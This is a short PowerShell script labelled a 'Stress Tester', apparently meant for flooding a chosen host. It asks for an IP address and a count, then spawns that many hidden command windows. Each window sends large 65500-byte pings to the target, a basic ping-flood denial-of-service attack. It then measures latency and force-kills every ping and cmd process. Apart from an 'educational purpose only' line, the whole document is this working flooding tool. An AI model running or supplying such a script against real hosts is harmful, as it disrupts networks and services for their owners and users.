Clear-Host

Write-Host "Welcome to the Stress Tester"
Write-Host "For Educational purpose only!"
Write-Host ""

$ip = Read-Host "Enter the IP"
$rp = Read-Host "How many cmds (The more the merrier)"

Write-Host ""
Write-Host "Starting the test"

For ($i = 1; $i -le $rp; $i++) {
    Start-Process cmd -WindowStyle Hidden -ArgumentList "/k ping $ip -t -l 65500 -n 50"
}

Write-Host ""
Write-Host "Done"
Start-Sleep -Seconds 2
Clear-Host

Write-Host "This will show you the delay you apply on the switch"
Write-Host "This part won't last long for lag prevention"
Write-Host ""
ping $ip -n 15

Write-Host ""
Write-Host "You can now see the most latency it got"
Start-Sleep -Seconds 5

Clear-Host

Start-Process cmd -WindowStyle Hidden -ArgumentList "/k taskkill /im ping.exe /f"
Start-Process cmd -WindowStyle Hidden -ArgumentList "/k taskkill /im cmd.exe /f"